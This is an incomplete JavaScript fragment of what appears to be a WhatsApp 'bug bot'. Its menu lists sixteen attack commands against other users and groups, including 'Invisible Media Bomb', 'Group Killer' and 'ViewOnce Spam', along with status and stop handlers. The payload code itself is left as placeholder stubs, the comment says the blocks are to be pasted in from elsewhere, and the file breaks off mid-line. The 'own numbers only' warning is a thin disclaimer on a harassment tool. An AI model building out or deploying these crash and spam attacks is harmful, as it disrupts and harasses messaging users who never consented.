            const warning = "⚠️ TEST ONLY ON YOUR OWN NUMBERS! RAW MODE - HIGH BAN RISK";

            // Menu
            if (cmd === 'menu' || cmd === 'help') {
                const menuText = `╔══════════════════════════════╗
║ 🔥 SANUKA ULTIMATE BEAST BOT v9.5 🔥
║         💀 FULL NUCLEAR 💀
╚══════════════════════════════╝

.bug1 to .bug8  → Classic
.bug9           → Invisible Media Bomb
.bug10          → Basic Group Killer
.bug11          → Fake Quoted Reply
.bug12          → ViewOnce Spam
.bug13          → Interactive List Bomb
.bug14          → Broken Audio
.bug15          → Fake Forwarded
.bug16          → GROUP KILLER Mention + Reaction

.status | .stopbug | .menu

⚠️ Use only on your own numbers!`;
                await reply(menuText);
                return;
            }

            // Paste all your bug1 to bug16 here (from previous messages)
            // For brevity, I'm showing only the structure. Replace with your full bug blocks.

            if (cmd === 'bug1') { /* your bug1 code */ }
            // ... add all other bugs (bug2 to bug16) here ...

            else if (cmd === 'status') {
                await reply(`✅ *BEAST STATUS*\n• Mode: RAW NUCLEAR\n• Connected: Yes`);
            }
            else if (cmd === 'stopbug') {
                isBotStopped = true;
                await reply("🛑 All attacks stopped.");
                setTimeout(() => isBotStopped = false, 300000);
            }
        });

    } catch (err) {
        console.error("💥 Fatal error:", err.message);
        setTimeout(startBot, 15000);
    }
}

startBot().catch(err => {
